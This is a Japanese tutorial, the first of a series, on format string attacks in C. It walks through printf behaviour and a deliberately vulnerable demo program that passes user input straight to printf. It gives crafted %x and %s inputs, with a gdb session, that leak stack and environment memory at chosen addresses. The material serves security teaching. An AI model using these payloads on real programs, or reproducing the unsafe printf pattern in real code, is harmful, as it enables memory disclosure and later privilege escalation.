x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: はじめてのハッキング　〜フォーマットストリング攻撃1〜  ---

著者：Defolos

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　前回はBOFを利用してプログラム実行の流れを変更しました。今回は任意プログ
ラムを実行できるバグとして知名度でBOFと双璧をなすフォーマットストリング攻
撃について説明したいと思います。この攻撃手法はフォーマットストリングバグ
というバグをついた攻撃手法であり、長年その存在が知られていながら致命的な
脅威にはならないであろうと考えられ放置されてきました。しかし、権限奪取が
行えることが示されてから特に注目されるようになり、今日では厳しくバグチェ
ックをするべきバグのひとつとなっています。プログラムの流れを変えることの
できる攻撃手法ですが、BOFとはまったく別の原理を用いています。 


■0x02.) フォーマットストリングとは

　フォーマットストリングは書式指定文字列と和訳され、printf関数などの引数
として利用される文字列のことです。実例としては次のようなものです。printf
()に渡される第一引数の部分「"test: a=%d, a=%c, b=0x%x\n"」がフォーマット
ストリングです。

-----
int a=65, b=12;
printf("test: a=%d, a=%c, b=0x%x\n", a, a, b);
-----

　上記の例をコンパイルし実行すると「test: a=65, a=A, b=0xc」と表示されま
す。お気づきのように、%dや%xなどの記号が100やcに置き換わっています。prin
tf関数本来の動作は引数として渡された文字列を画面に表示することですので「
test: a=%d, b=0x%x\n」と表示されるように感じますが、printf()などの関数は
フォーマットストリングが引数として渡された場合は%dなどの記号を適宜置き換
えて表示するようになっています。フォーマットストリングの左端から探索して、
初めに出てきた%記号の部分を第2引数に指定された変数の値に置き換え、2番目に
出てきた%記号の部分を第3引数に指定された変数の値に置き換えます。

●変換指定文字

　フォーマットストリングは%の部分を、それに対応する変数の値に置き換えて表
示します。%の後にはアルファベット1文字が続き、その文字によって出力する時
の形式を変更できます。例えば「%d」というように%の後にdを付加すると、対応
する変数を10進数の数値で表示します。同様に「%c」と指定すれば対応する変数
を文字として表示します。文字コードにはASCIIコードが使われますので、65とい
う数値は「A」に変換されて表示されます。次に変換指定文字のリストを示します。

----------------------
%d   10進数の数値
%o   8進数の数値
%x   16進数の数値
%c   1文字
%s   文字列
%f   実数形式
----------------------

　先ほど例として挙げたコードを少し変更し、次のようなコードを記述します。

-----
int a=65, b=12;
printf("test: a=%f, b=%o\n", a, b);
-----

　このコードをコンパイルして実行すると「test: a=65.0000, b=14」と表示され
ます。前回は変数aの中身を10進数と文字として出力しましたので、65とAが表示
されました。今回は実数を指定しましたので65.0000のように実数形式で表示され
ました。同様に、変数bも今回は8進数を指定していますので14と出力されていま
す。このように、フォーマットストリングは出力の形式を簡単に指定することの
できる便利な仕組みなのです。


■0x03.) printf関数とフォーマットストリングの動作

　ここではフォーマットストリングをよく利用する、printf()を用いて解説を行
います。ほかにもフォーマットストリングを利用する関数はありますが、同様の
動作をしていると考えていただいて結構です。

●関数の呼び出し

　関数を呼び出すときは、戻りアドレスや引数をスタックに積むということを以
前お話ししました。printf()を呼び出すときも引数をスタックに積んだ後に処理
が移行されます。例えば「printf("a=%d,b=%d", a, b);」というコードを実行す
ると、まずスタックに変数bの値が積まれ、次に変数aの値が積まれます。最後に
「a=%d,b=%d」という文字列が積まれます。

[stack]
------low
ret
------0x0000004
a=%d,b=%d
------0x000000d
a
------0x0000011
b
------high

　printf()の中ではディスプレイへの表示処理を行います。まず、第一引数の部
分である「a=%d,b=%d」を前から順番に出力していきます。はじめて%を発見した
場合、第二引数が格納されているアドレス(0x000000d)の内容を読み込んでディス
プレイに出力し、%を見つけるまで同様に出力していきます。次に%を見つけたと
きは第三引数が格納されているアドレス(0x0000011)の中身を読み込み、ディスプ
レイに表示します。第一引数の文字列すべてを表示し終わったらprintf関数の仕
事は終わりです。

●フォーマットストリングバグ

　フォーマットストリングバグは、フォーマットストリング中の変換指定文字の
数と引数の数に不一致がある場合に発生するバグです。例えば次のコードをご覧
ください。

-----
#include <stdio.h>

int main(int argc, char *argv[]){

    int a=100;
    printf("%d, %d, %d, %d, %d, %d, %d, %d, %d", a);
    return 0;
}
-----

　フォーマットストリングには変換指定文字が9個出現していますが、printf()に
渡された引数は変数aのひとつだけです。先ほどの関数呼び出しの手順をここで再
現すると、重大なバグに気づくと思います。
　printf関数を呼び出す場合、まず変数aの値がスタックに積まれます。次にフォ
ーマットストリングである「%d, %d, %d, %d, %d, %d, %d, %d, %d」がスタック
に積まれprintf()に制御が移ります。

[stack]
------low
ret
------0x0000004
%d, %d, %d, %d, %d, %d, %d, %d, %d
------0x0000028
a
------0x000002c
98
------high

　フォーマットストリングを探索し、はじめの変換指定文字に出会うと第2引数が
格納されているアドレスの中身に置き換えます。ここまでは前回と同じですが、
次の変換指定文字に出会ったときに問題が発生します。printf()は引数の個数と
フォーマットストリング中の変換指定文字の数との整合性は一切関知しません。
つまり、エラーを出力することはなく、本来なら第三引数が格納されているであ
ろう場所のアドレスの中身を表示します。上記の例では0x000002c番地の中身であ
る98が出力されます。実際にコンパイルし実行してみます。

-----
fa72006@sh<27> gcc -Wall test.c
test.c: In function `main':
test.c:7: 警告: フォーマットへの引数が少なすぎます
fa72006@sh<28> ./a.out
100, 0, 0, 0, 0, -4196140, 4, 100, 5
-----

　上記のようにメモリ内のデータが読み出されています。上記の例の場合はメモ
リの中身が次のようになっているとわかります。アドレスは適当ですが、メモリ
内に格納されているデータはこの通りです。

[stack]
------low
ret
------0x0000004
%d, %d, %d, %d, %d, %d, %d, %d, %d
------0x0000028
a
------0x000002c
0
------0x0000030
0
------0x0000034
0
------0x0000038
0
------0x000003c
-4196140
------0x0000040
4
------0x0000044
100
------0x000003c
5
------high


■0x04.) 任意メモリの読み出し

　前の例では、フォーマットストリング中の変換指定文字の数と関数に渡される
変数の数の不一致はハードコードされていました。一度でも実行すればバグがあ
ることがわかるので、通常のプログラムにはこのようなバグは存在し得ません。
しかし、文字列を表示する場合はこのバグが混入する可能性があります。次よう
なプログラムを用意します。

-----  formatstring.c
#include <stdio.h>

int main (int argc, char *argv[]){

    char text[1024];
    static int test_val = -72;

    if(argc != 2){
        printf("Usage:%s <Output Message>\n", argv[0]);
        return 0;
    }
    strcpy(text, argv[1]);

    printf("Good:\n");
    printf("%s", text);
    printf("\n");

    printf("Bad:\n");
    printf(text);
    printf("\n");

    printf("[DEBUG] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    return 0;
}
-----

　コマンドライン引数として与えられた文字列を2回表示するだけのプログラムで
すが、printf()に渡している引数に注目ください。1回目の表示では%sでtextを表
示していますが、2回目の表示ではtextを直接指定して表示しようとしています。
これをコンパイルして実行すると次のようになります。

-----
defolos@glazheim:~/Desktop$ ./a.out test
Good:
test
Bad:
test
[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
-----

　ご覧の通り、両者とも引数として受け取った文字列を出力できていますが、2回
目の出力部分はフォーマットストリングバグを抱えています。より詳しく説明す
ると「printf("%s", text);」の「%s」は次の引数で与えられた配列の先頭アドレ
スを受け取り、そこからNULLまでを文字として出力します。1回目の出力時のスタ
ックは次のようになっています。

[stack]
------low
ret
------0x0000004
%s[NULL]
------0x0000006
t
------0x0000007
e
------0x0000008
s
------0x0000009
t
------0x000000a
.
------0x000000b
NULL
------high

　フォーマットストリングを出力するとき、%sに出会うので第2引数として渡され
たtext配列のアドレス(0x0000006-0x000000b)をNULLが検出されるまで出力します。
さらにフォーマットストリングを出力するときも終端はNULLで判別されます。次
に2回目の出力時のスタックを示します。

[stack]
------low
ret
------0x0000004
t
------0x0000006
e
------0x0000007
s
------0x0000008
t
------0x0000009
.
------0x000000a
NULL
------high

　今回はフォーマットストリングとしてtext配列が渡されていますので、text配
列のアドレス(0x0000004-0x000000a)を出力します。最終的に0x000000aでNULLに
出会うので、0x000000aまでをフォーマットストリングだと認識して出力します。
通常の文字をコマンドライン引数に指定しても特に問題はありませんが、ここに
変換指定文字を含めるとどうなるでしょう。

-----
defolos@glazheim:~/Desktop$ ./a.out test%x
Good:
test%x
Bad:
testbffff550
[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
-----

　スタックの内容が表示されました。これはprintf()がフォーマットストリング
として与えられたtext配列を出力する際、変換指定文字に出会ったところで、本
来第二引数が格納されているであろうアドレスをprintf()が読み出しているため
に起こります。これを利用すれば任意のアドレスの値を出力することができます。
　次のようにperlスクリプトを使って「%08x.」を50回入力します。全部手で打つ
のは面倒なのでperlを使ってます。ちなみに、%08xは8桁の16進数で表示するとい
う変換指定文字です。

-----
defolos@glazheim:~/Desktop$ ./a.out `perl -e 'print "%08x."x50;'`
Good:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
%08x.%08x.%08x.%08x.%08x.%08x.
Bad:
bffff450.00000000.4001670c.00000002.00000004.00000000.
00000000.78383025.3830252e.30252e78.252e7838.2e783830.
78383025.3830252e.30252e78.252e7838.2e783830.78383025.
3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
30252e78.252e7838.2e783830.78383025.3830252e.30252e78.
252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
78383025.3830252e.30252e78.252e7838.2e783830.78383025.
3830252e.30252e78.
[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
-----

　252e7838という数値の繰り返しが目立ちますが、これは「%08x.」という文字が
出力されているからです。つまり、78383025がはじめに現れるところからは引数
として渡された配列のアドレス内容をのぞいているということになります。retと
引数が格納されているアドレスとの間には多少の隙間がありますが、この隙間の
サイズはシステムやコンパイラによって変化します。ゆえに、まず攻撃対象のシ
ステムで任意のメモリの内容を表示するために変換指定文字をいくつ重ねればよ
いのかを計測します。

-----
defolos@glazheim:~/Desktop$ ./a.out AAAA`perl -e 'print "%08x."x8;'`
Good:
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
Bad:
AAAAbffff520.00000000.4001670c.00000002.00000004.00000000.
00000000.41414141.
[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
-----

　41という数字は文字では「A」ですので、どうやら8個で良いようです。今回、
引数のはじめに方にAAAAを渡していますので、41414141という数値が現れた部分
が引数として渡した配列の開始場所です。つまり、8個目の変換指定文字に%sを記
述すれば、0x41414141番のアドレスの中身をNULLが出現するまで出力します。%s
はその変換指定文字が対応する引数のアドレス内を参照する点にご注意ください。

[stack]
------row
bffff520 (ret)
------
00000000
------
4001670c
------
00000002
------
00000004
------
00000000
------
00000000
------
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.[NULL] (text)
------
....
------0x41414141
????
------high

　とりあえず環境変数の値を出力してみましょう。環境変数のアドレスの求め方
は次のようにgdbを利用します。

-----
[Get envaiorment values]
defolos@glazheim:~/Desktop$ gdb a.out
(gdb)break main
(gdb)run
(gdb)x/20s $esp
....
0xbffffad1: ""
0xbffffad2: "i686"
0xbffffad7: "/home/defolos/Desktop/a.out"
0xbffffaf3: "SSH_AGENT_PID=4328"
0xbffffb06: "SHELL=/bin/bash"
0xbffffb16: "DESKTOP_STARTUP_ID="
0xbffffb2a: "TERM=xterm"
0xbffffb35: "GTK_RC_FILES=/etc/gtk/gtkrc:/home/defolos/.gtkrc-1.2-gnome2"
0xbffffb71: "WINDOWID=20971594"
0xbffffb83: "USER=defolos"
....
-----

　USERのところを出力してみましょう。アドレスは0xbffffb83であることがわか
ります。これに15を加算した0xbffffb98が渡すべき引数です。リトルエンディア
ンを考慮し、下位2文字から順に記述します。8文字目の変換指定文字に%sを指定
すれば、丁度引数の開始アドレスの中身（\x98\xfb\xff\xbf）に格納されている
アドレスの内容を表示することができます。

-----
defolos@glazheim:~/Desktop$ ./a.out `printf "\x98\xfb\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%s
Good:
\uffff\uffff\uffff%x.%x.%x.%x.%x.%x.%x.%s
Bad:
\uffff\uffff\uffffbffff530.0.4001670c.2.4.0.0.USER=defolos
[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
-----

　上手く出力されていますね。15を加算しなければいけない理由はよくわからな
いのですが、実行ファイルの名前の長さが増えると環境変数のアドレスは2バイト
小さい値を指定しなければ参照できないようです。このようにして任意のアドレ
スの内容を表示することができるのです。


■0x05.) おわりに

　今回みてきたように、フォーマットストリングバグを応用すればメモリ内の値
をのぞき見ることができます。しかし、ハッキングの目的は本質的にメモリ内容
を書き換えることにあります。関数の戻りアドレスが格納されているメモリ番地
をペイロードの格納されているメモリ番地に書き換えることでプログラムの流れ
を変えることができ、権限の奪取が行えるのです。ゆえに、任意にメモリ内の書
き換えが行えないバグは利用価値が低いと言えます。実は、フォーマットストリ
ングバグは任意にメモリを書き換えることのできるバグなのです。その手法は次
回お話しすることとしますので、お楽しみに。
　それではまたお会いしましょう。



